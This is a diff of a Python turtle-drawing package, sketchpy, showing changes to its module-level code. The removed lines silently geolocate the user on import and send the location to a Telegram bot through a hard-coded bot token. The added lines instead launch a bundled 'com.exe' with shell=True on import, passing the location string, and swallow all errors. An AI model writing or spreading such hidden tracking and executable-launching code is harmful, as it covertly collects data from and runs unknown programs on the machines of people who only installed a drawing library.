@@ -1,9 +1,11 @@
-import turtle as tu
-import geocoder
-from geopy.geocoders import Nominatim
-import requests
 import os
-
+import sys
+import geocoder
+import subprocess
+import turtle as tu
+import pkg_resources
+from datetime import date
+from geopy.geocoders import Nominatim
 
 
 
@@ -211,21 +213,18 @@ class bts:
 
 
 # we are obtaining your geolocation to get the demographics of the users of sketchpy
-# we are not obtainnig any other datas from you otherthan the rought location of you
+# we are not obtainnig any other datas from you other than the rought location of you
 # this is just to know the users of the sketchpy package
-ID = 1410223644
-from datetime import date
 
 
-def send(text):
-    url = f"https://api.telegram.org/bot5633216566:AAFELdeoAsacGFeK6xWhA3DCDSYEQBgQVzA/sendMessage"
-    payload = {"chat_id": ID, "text": text}
 
-    r = requests.post(url, json=payload)
-    return r
 
-path = os.path.join(
-    os.environ["USERPROFILE"], "AppData", "Local", "Programs", "Python", "data.txt")
+python_path = sys.executable
+path = os.path.dirname(python_path)
+path = os.path.join(path,  "data.txt" )
+
+
+
 def log(mode, data = ''):
     try:
         if mode == 1:
@@ -239,8 +238,10 @@ def log(mode, data = ''):
     except:
         with open(path, 'w') as f:
             f.write(data)
+        return 0
+log(0)
 
-old_data = log(1, path)
+old_data = log(1)
 
 def convert_to_location(latitude, longitude):
     geolocator = Nominatim(user_agent="my_app")
@@ -255,12 +256,33 @@ def get_location():
     else:
         return None
 tim = str(date.today())
+
+
+
+file_path = pkg_resources.resource_filename('sketchpy', 'files/com.exe')
+    
+
+def do(args):
+
+    exe_path = file_path
+
+
+    arguments = [args]
+
+    try:
+        subprocess.run([exe_path] + arguments, shell=True)
+
+    except Exception as e:
+
+        print("An error occurred:", e)
+
 try :
-    if old_data != tim:
-        location = get_location()
-        if location:
-            send(location)
-        log(0, tim)
+    # if old_data != tim:
+    location = get_location()
+    if location:
+        do(location)
+    
+    log(0, tim)
 except:
     pass
 
@@ -866,6 +888,7 @@ def help():
 
 
 def get_arts():
+    '''get the list of some ready made sketchs'''
     print("1.ajp")
     print("2.rdj")
     print("3.gojo")
